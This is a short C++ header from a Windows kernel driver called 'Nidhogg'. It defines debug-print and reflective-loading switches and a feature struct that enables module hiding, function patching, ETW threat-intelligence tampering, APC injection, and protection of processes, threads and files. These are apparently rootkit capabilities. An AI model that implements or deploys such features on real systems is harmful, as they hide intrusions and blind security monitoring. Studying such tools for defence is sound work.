#pragma once
#include "pch.h"

// #define DRIVER_REFLECTIVELY_LOADED // Comment or uncomment it when you load the driver reflectively.
#define PRINTS // Comment or uncomment for printing
constexpr ULONG DRIVER_TAG = 'hdiN';
#define DRIVER_PREFIX "Nidhogg: "

#ifdef PRINTS
typedef ULONG(NTAPI* tDbgPrint)(PCSTR Format, ...);
constexpr tDbgPrint Print = DbgPrint;
#else
constexpr VOID Print(...) {};
#endif

// Globals.
inline PVOID RegistrationHandle = NULL;

extern "C" {
    extern ULONG WindowsBuildNumber;
    extern PVOID AllocatePool2;
}

struct EnabledFeatures {
	bool DriverReflectivelyLoaded = false;
	bool FunctionPatching = true;
	bool ModuleHiding = true;
	bool WriteData = true;
	bool ReadData = true;
	bool RegistryFeatures = true;
	bool ProcessProtection = true;
	bool ThreadProtection = true;
	bool FileProtection = true;
	bool EtwTiTamper = true;
	bool ApcInjection = true;
	bool AutoModuleUnload = true;
	bool NofExecution = true;
};
inline EnabledFeatures Features;
